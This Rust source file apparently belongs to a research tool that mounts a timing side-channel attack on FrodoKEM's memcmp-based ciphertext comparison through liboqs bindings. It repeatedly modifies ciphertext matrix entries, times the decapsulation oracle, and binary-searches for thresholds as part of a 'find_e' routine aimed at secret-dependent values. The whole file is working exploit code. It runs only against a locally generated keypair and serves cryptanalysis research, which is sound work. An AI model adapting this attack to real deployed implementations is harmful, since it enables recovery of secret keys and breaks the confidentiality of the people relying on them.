use crate::attack::memcmp_frodo::MeasureSource;
use liboqs_rs_bindings as oqs;
use log::{debug, info, trace, warn};
use log_derive::{logfn, logfn_inputs};
use oqs::frodokem::FrodoKem;
use std::convert::TryInto;

enum Sign<T> {
    Plus(T),
    Minus(T),
}

/// Function that deterministically modifies the input vector.
///
/// To undo apply the same modification one more time
fn modify<FRODO: FrodoKem>(
    ct: &mut FRODO::Ciphertext,
    index_ij: usize,
    amount: Sign<u16>,
) -> Result<bool, String> {
    #![allow(non_snake_case)]
    trace!("started modify!");
    //Unpack the buffer into a pair of matrices encoded as a vector
    let (Bp, mut C) = FRODO::unpack(ct)?;
    let Cslice = FRODO::C_as_slice(&mut C);

    let tomod = &mut Cslice[index_ij];

    let res = match amount {
        Sign::Plus(a) => {
            // Check for overflow
            if FRODO::qmax() - a >= *tomod {
                *tomod += a;
                true
            } else {
                false
            }
        }
        Sign::Minus(a) => {
            if let Some(res) = Cslice[index_ij].checked_sub(a) {
                Cslice[index_ij] = res;
                true
            } else {
                trace!("{} - {} = ?", Cslice[index_ij], a);
                panic!("What is this? This should never happen!?");
            }
        }
    };

    if res {
        //Repack the matrices into the buffer
        FRODO::pack(Bp, C, ct)?;
    }

    Ok(res)
}

/// Using binary search to find the maximum amount of modification that will not overflow the integer
#[logfn(Debug)]
fn max_mod<FRODO: FrodoKem>(index_ij: usize, ct: &mut FRODO::Ciphertext) -> Result<u16, String> {
    let mut high = FRODO::qmax();
    let mut low = 0;
    Ok(loop {
        let currentmod: u16 = ((high as u32 + low as u32) / 2)
            .try_into()
            .map_err(|_| "overflow")?;
        // test modify
        if modify::<FRODO>(ct, index_ij, Sign::Plus(currentmod))? {
            low = currentmod;
            //undo it
            modify::<FRODO>(ct, index_ij, Sign::Minus(currentmod))?;
        } else {
            high = currentmod;
        }
        if high - 1 <= low {
            break low;
        }
    })
}

#[logfn(Trace)]
fn mod_measure<FRODO: FrodoKem>(
    amount: u16,
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: Option<u64>,
    ct: &mut FRODO::Ciphertext,
    ss: &mut FRODO::SharedSecret,
    sk: &mut FRODO::SecretKey,
) -> Result<Option<u64>, String> {
    //Modify
    if modify::<FRODO>(ct, index_ij, Sign::Plus(amount))? {
        let mut lowest = u64::max_value();
        'sample: for _ in 0..iterations {
            let m = measure_source.measure(|| FRODO::decaps_measure(ct, ss, sk));
            if let Some(time) = m? {
                if time < lowest {
                    lowest = time;
                    if let Some(t) = short_circuit_threshold {
                        if lowest < t {
                            break 'sample;
                        }
                    }
                }
            };
        }
        //Unmodify
        modify::<FRODO>(ct, index_ij, Sign::Minus(amount))?;
        Ok(Some(lowest))
    } else {
        // We could not modify due to overflow, we report this and try a lower number
        Ok(None)
    }
}

fn search_modification<FRODO: FrodoKem>(
    index_ij: usize,
    iterations: usize,
    measure_source: &MeasureSource,
    short_circuit_threshold: u64,
    ciphertext: &mut FRODO::Ciphertext,
    shared_secret_d: &mut FRODO::SharedSecret,
    secret_key: &mut FRODO::SecretKey,
) -> Result<u16, String> {
    let mut high = max_mod::<FRODO>(0, ciphertext)?;
    let mut low = 0;
    let maxmod = loop {
        let currentmod: u16 = ((high as usize + high as usize + low as usize) as usize / 3)
            .try_into()
            .map_err(|_| "overflow")?;
        debug!("high: {}, low: {}", high, low);
        info!(
            "Testing {} bitflips with {} iterations",
            currentmod, iterations
        );
        let time = mod_measure::<FRODO>(
            currentmod,
            index_ij,
            iterations,
            &measure_source,
            Some(short_circuit_threshold),
            ciphertext,
            shared_secret_d,
            secret_key,
        )?;

        if let Some(time) = time {
            debug!("time measurment is {}", time);
            if time >= short_circuit_threshold {
                info!("+Raising lowerbound to {}", currentmod);
                low = currentmod;
            } else {
                info!("-Lowering upperbound to {}", currentmod);
                high = currentmod;
            }
        } else {
            warn!("Got overflow, lowering upperbound to {}", currentmod);
            high = currentmod;
        }
        if high - low == 1 {
            break low;
        }
    };
    Ok(maxmod)
}

#[logfn_inputs(Trace)]
pub fn find_e<FRODO: FrodoKem>(
    warmup: usize,
    iterations: usize,
    measure_source: MeasureSource,
) -> Result<(), String> {
    info!(
        "Launching the find_e routine against {} MEMCMP vulnerability.",
        FRODO::name()
    );
    let mut public_key = FRODO::zero_pk();
    let mut secret_key = FRODO::zero_sk();
    let mut ciphertext = FRODO::zero_ct();

    info!("Generating keypair");
    FRODO::keypair(&mut public_key, &mut secret_key)?;

    info!("Encapsulating shared secret and generating ciphertext");
    let mut shared_secret_e = FRODO::zero_ss();
    let mut shared_secret_d = FRODO::zero_ss();
    FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;

    info!("Running decryption oracle {} times for warmup.", warmup);
    let warmuptime = mod_measure::<FRODO>(
        0,
        0,
        warmup,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;
    debug!("Warmup time {}", warmuptime.unwrap());

    info!("Running {} iterations with a low {} cipertext modification at the start of C to establish upper bound timing threshold.", iterations, 1);
    let threshold_high = mod_measure::<FRODO>(
        1,
        0,
        iterations,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?
    .unwrap();

    let maxmod = max_mod::<FRODO>(0, &mut ciphertext)?;

    info!("Running {} iterations with max cipertext modification ({}) at index 0 of C to establish lower bound timing threshold.", iterations, maxmod);
    let threshold_low = mod_measure::<FRODO>(
        maxmod,
        0,
        iterations,
        &measure_source,
        None,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?
    .unwrap();

    let threshold = (threshold_high + threshold_low) / 2;
    info!(
        "Using ({}+{})/2={} as threshold value, everything below will be used to detect changes to B as well.", threshold_high, threshold_low,
        threshold
    );

    info!("Starting binary search for determining maximum modifications to C without changing B.");

    let themod = search_modification::<FRODO>(
        0,
        iterations,
        &measure_source,
        threshold,
        &mut ciphertext,
        &mut shared_secret_d,
        &mut secret_key,
    )?;

    info!(
        "{} is the maximum amount of modifications that can be performed without affecting B",
        themod
    );

    Ok(())
}
